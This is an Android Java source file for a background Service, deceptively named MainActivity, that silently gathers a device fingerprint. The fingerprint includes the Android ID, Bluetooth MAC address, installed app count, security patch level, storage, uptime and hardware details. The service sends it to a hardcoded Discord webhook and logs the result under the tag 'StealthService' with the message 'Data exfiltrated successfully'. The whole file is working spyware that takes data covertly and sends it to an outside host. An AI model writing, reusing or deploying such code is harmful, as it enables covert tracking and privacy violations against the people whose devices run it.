package com.example.payload;

import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.StatFs;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.DisplayMetrics;
import android.util.Log;
import android.bluetooth.BluetoothAdapter;
import android.content.pm.PackageManager;
import android.os.Environment;
import java.util.Locale;

import org.json.JSONObject;

import java.net.HttpURLConnection;
import java.net.URL;
import java.io.OutputStreamWriter;

public class MainActivity extends Service {

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(this::collectAndSendData).start();
        return START_NOT_STICKY;
    }

    private void collectAndSendData() {
        try {
            // Device identifiers
            String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

            // Hardware info
            DisplayMetrics metrics = new DisplayMetrics();
            String screenRes = metrics.widthPixels + "x" + metrics.heightPixels;

            // Software info
            int appCount = getPackageManager().getInstalledPackages(PackageManager.GET_META_DATA).size();
            String securityPatch = Build.VERSION.SECURITY_PATCH;

            // Storage info
            StatFs statFs = new StatFs(Environment.getDataDirectory().getPath());
            long freeGB = (statFs.getAvailableBlocksLong() * statFs.getBlockSizeLong()) / (1024 * 1024 * 1024);

            // Network identifiers
            BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
            String btMac = bluetoothAdapter != null ? bluetoothAdapter.getAddress() : "N/A";

            // System metrics
            long uptimeMillis = SystemClock.elapsedRealtime();

            JSONObject payload = new JSONObject();
            payload.put("content", "**Device Fingerprint**\n```" +
                    "Model: " + Build.MODEL + "\n" +
                    "Manufacturer: " + Build.MANUFACTURER + "\n" +
                    "Android: " + Build.VERSION.RELEASE + "\n" +
                    "Android ID: " + androidId + "\n" +
                    "Screen: " + screenRes + "\n" +
                    "Apps: " + appCount + "\n" +
                    "Security Patch: " + securityPatch + "\n" +
                    "Storage Free: " + freeGB + "GB\n" +
                    "BT MAC: " + btMac + "\n" +
                    "Uptime: " + formatUptime(uptimeMillis) + "\n" +
                    "Hostname: " + Build.HOST + "\n" +
                    "CPU: " + Build.SUPPORTED_ABIS[0] + "```");

            HttpURLConnection conn = (HttpURLConnection) new URL("https://discord.com/api/webhooks/1348153562852757597/znZ9fwfzaUeUGE8VSy7YWC6EWNhrwsbFITap0sjjiYHc3238BCYg7MMZX-_amhWZRntC").openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            try (OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream())) {
                writer.write(payload.toString());
            }

            if (conn.getResponseCode() == 204) {
                Log.i("StealthService", "Data exfiltrated successfully");
            }
        } catch (Exception e) {
            Log.e("StealthService", "Exfiltration error: " + e.getMessage());
        } finally {
            stopSelf();
        }
    }

    private String formatUptime(long millis) {
        long seconds = millis / 1000;
        long days = seconds / 86400;
        return days + " days";
    }
}
